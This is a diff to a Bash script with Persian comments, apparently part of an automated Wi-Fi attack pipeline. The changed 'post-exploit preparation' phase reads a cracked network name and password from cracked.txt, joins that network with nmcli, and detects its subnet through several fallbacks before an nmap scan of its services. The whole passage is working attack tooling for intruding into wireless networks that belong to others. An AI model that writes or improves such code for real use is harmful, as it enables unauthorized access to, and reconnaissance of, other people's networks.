@@ -553,21 +553,43 @@ if [ "$SKIP_TO" -le 7 ] && [ "$DO_POST" -eq 1 ] && [ -s "$WORK/cracked.txt" ]; t
   hr; c "فاز ۶ — آماده‌سازی post-exploit"
   first=$(head -1 "$WORK/cracked.txt")
   b=$(cut -d'|' -f1 <<<"$first"); p=$(cut -d'|' -f2 <<<"$first")
-  # تشخیص subnet واقعی شبکهٔ کرک‌شده (best-effort)
-  SUBNET="192.168.1.0/24"
-  if [ -n "${IFACE2:-}" ] && command -v nmcli >/dev/null; then
-    c "  → اتصال به شبکه برای تشخیص subnet (via $IFACE2)"
-    if nmcli dev wifi connect "$b" password "$p" ifname "$IFACE2" >/dev/null 2>&1; then
-      sleep 5
-      det=$(ip -4 route 2>/dev/null | awk -v dev="$IFACE2" '$0 ~ dev && /proto kernel/ {print $1; exit}')
-      [ -n "$det" ] && SUBNET="$det"
-      ok "subnet تشخیص داده شد: $SUBNET"
-      nmcli dev disconnect "$IFACE2" >/dev/null 2>&1 || true
-    else
-      warn "اتصال برای تشخیص subnet ناموفق؛ پیش‌فرض $SUBNET"
+  # تشخیص subnet واقعی شبکهٔ کرک‌شده (best-effort, چند روش)
+  detect_subnet() {
+    local sub="" gw det
+    # ۱) اتصال موقت از طریق IFACE2
+    if [ -n "${IFACE2:-}" ] && command -v nmcli >/dev/null; then
+      c "  → اتصال به شبکه برای تشخیص subnet (via $IFACE2)"
+      if nmcli dev wifi connect "$b" password "$p" ifname "$IFACE2" >/dev/null 2>&1; then
+        sleep 5
+        det=$(ip -4 route 2>/dev/null | awk -v dev="$IFACE2" '$0 ~ dev && /proto kernel/ {print $1; exit}')
+        [ -n "$det" ] && sub="$det"
+        nmcli dev disconnect "$IFACE2" >/dev/null 2>&1 || true
+      fi
     fi
+    # ۲) مسیرهای kernel موجود (اتصال قبلی)
+    if [ -z "$sub" ]; then
+      sub=$(ip -4 route 2>/dev/null | awk '/proto kernel/ {print $1; exit}')
+    fi
+    # ۳) فایل‌های DHCP lease
+    if [ -z "$sub" ]; then
+      for f in /var/lib/dhcp/*.leases /var/lib/NetworkManager/*.lease; do
+        [ -r "$f" ] || continue
+        gw=$(grep -oE 'option routers [0-9.]+' "$f" 2>/dev/null | awk '{print $3}' | head -1)
+        [ -n "$gw" ] && { IFS=. read -r o1 o2 o3 _ <<<"$gw"; sub="${o1}.${o2}.${o3}.0/24"; break; }
+      done
+    fi
+    # ۴) gateway پیش‌فرض → فرض /24
+    if [ -z "$sub" ]; then
+      gw=$(ip -4 route 2>/dev/null | awk '/default/ {print $3; exit}')
+      [ -n "$gw" ] && { IFS=. read -r o1 o2 o3 _ <<<"$gw"; sub="${o1}.${o2}.${o3}.0/24"; }
+    fi
+    printf '%s' "${sub:-192.168.1.0/24}"
+  }
+  SUBNET=$(detect_subnet)
+  if [ "$SUBNET" = "192.168.1.0/24" ]; then
+    warn "subnet تشخیص داده نشد؛ پیش‌فرض $SUBNET"
   else
-    warn "IFACE2/nmcli نیست؛ nmap روی پیش‌فرض $SUBNET اجرا می‌شود."
+    ok "subnet تشخیص داده شد: $SUBNET"
   fi
   # nmap: اسکن شبکهٔ کرک‌شده برای شناسایی سرویس‌ها
   if command -v nmap >/dev/null; then
